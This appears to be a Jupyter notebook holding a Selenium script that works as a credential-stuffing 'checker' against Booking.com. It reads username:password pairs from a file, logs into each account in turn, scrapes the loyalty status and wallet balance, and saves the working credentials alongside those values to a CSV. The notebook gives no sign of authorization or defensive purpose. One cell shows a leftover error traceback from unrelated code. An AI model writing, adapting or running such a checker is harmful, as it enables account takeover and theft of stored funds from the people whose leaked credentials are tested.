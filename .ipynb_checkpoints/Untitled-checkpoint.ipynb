{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "b1c877f5",
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.firefox.service import Service as FirefoxService\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.webdriver.support.ui import WebDriverWait\n",
    "from selenium.webdriver.firefox.options import Options\n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "import time, csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d84d1743",
   "metadata": {},
   "outputs": [],
   "source": [
    "login = \"https://account.booking.com/sign-in\"\n",
    "login_xpath = '//*[@id=\"username\"]'\n",
    "login_button = \"/html/body/div[1]/div/div/div/div[2]/div[1]/div/div/div/div/div/div/form/div[3]/button\"\n",
    "pass_xpath = '//*[@id=\"password\"]'\n",
    "pass_button = \"/html/body/div[1]/div/div/div/div[2]/div[1]/div/div/div/div/div/div/form/div[2]/button\"\n",
    "status = \"/html/body/header/nav/div[2]/div[7]/div/a/span/div/div[2]/span[2]/span\"\n",
    "balance = \"/html/body/div[4]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div\"\n",
    "wallet = \"https://secure.booking.com/rewards_and_wallet/wallet.id.html\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "216247bb",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'append_to_csv' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[32], line 22\u001b[0m\n\u001b[0;32m     19\u001b[0m data_to_append \u001b[38;5;241m=\u001b[39m [\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mName\u001b[39m\u001b[38;5;124m'\u001b[39m, \u001b[38;5;124m'\u001b[39m\u001b[38;5;124mAge\u001b[39m\u001b[38;5;124m'\u001b[39m, \u001b[38;5;124m'\u001b[39m\u001b[38;5;124mLocation\u001b[39m\u001b[38;5;124m'\u001b[39m]\n\u001b[0;32m     21\u001b[0m \u001b[38;5;66;03m# Append data to the CSV file\u001b[39;00m\n\u001b[1;32m---> 22\u001b[0m \u001b[43mappend_to_csv\u001b[49m(file_path, data_to_append)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'append_to_csv' is not defined"
     ]
    }
   ],
   "source": [
    "def save(data):\n",
    "    file_path = \"check.csv\"\n",
    "    file_exists = os.path.isfile(file_path)\n",
    "    with open(file_path, 'a', newline='') as csvfile:\n",
    "        csv_writer = csv.writer(csvfile)\n",
    "        if not file_exists:\n",
    "            csv_writer.writerow(['Username', 'Password', 'Status','Balance'])\n",
    "        csv_writer.writerow(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2c7c1e60",
   "metadata": {},
   "outputs": [],
   "source": [
    "def check(usn,pasw):\n",
    "    browser = webdriver.Firefox(service=FirefoxService(r\"C:\\geckodriver.exe\"))   \n",
    "    wait = WebDriverWait(browser, 15)\n",
    "    browser.get(login)\n",
    "    wait.until(EC.presence_of_element_located((By.XPATH, login_xpath))).send_keys(usn)\n",
    "    wait.until(EC.presence_of_element_located((By.XPATH, login_button))).click()\n",
    "    time.sleep(0.25)\n",
    "    wait.until(EC.presence_of_element_located((By.XPATH, pass_xpath))).send_keys(pasw)\n",
    "    wait.until(EC.presence_of_element_located((By.XPATH, pass_button))).click()\n",
    "    browser.get(wallet)\n",
    "    status_element = browser.find_element_by_xpath(status)\n",
    "    status_text = status_element.text\n",
    "    print(\"Status:\", status_text)\n",
    "    balance_element = browser.find_element_by_xpath(balance)\n",
    "    balance_text = balance_element.text\n",
    "    print(\"Balance:\", balance_text)\n",
    "    save([usn,pasw,status_text,balance_text])\n",
    "    browser.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc52e755",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('credentials.txt', 'r') as file:\n",
    "    lines = file.readlines()\n",
    "    for line in lines:\n",
    "        username, password = line.strip().split(':')\n",
    "        print(f\"Logging in with username: {username} and password: {password}\")\n",
    "        check(username, password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
